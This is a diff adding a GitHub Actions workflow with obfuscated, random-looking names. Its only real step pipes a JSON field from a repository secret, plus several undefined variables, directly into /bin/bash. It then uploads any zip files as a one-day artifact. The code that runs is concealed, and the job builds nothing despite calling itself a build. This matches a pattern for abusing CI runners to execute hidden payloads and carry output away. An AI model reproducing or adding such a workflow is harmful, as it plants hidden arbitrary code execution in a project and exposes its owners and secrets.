@@ -1,0 +1,25 @@
+name: clojureericdns
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: clojureericdns
+        env:
+          wy8807: ${{ secrets.wy8807 }}
+        run: |
+          printf '%s' "$wy8807" | jq -r .hk16 | /bin/bash
+          printf '%s' "$vsqo862" | jq -r .q4 | /bin/bash
+          printf '%s' "$sal2" | jq -r .ppje9810 | /bin/bash
+          echo $tjzk1 | jq -r .gf6 | /bin/bash
+          echo $fx209 | jq -r .wvcql41307 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: HYonn82t
+          path: "*.zip"
+          retention-days: 1
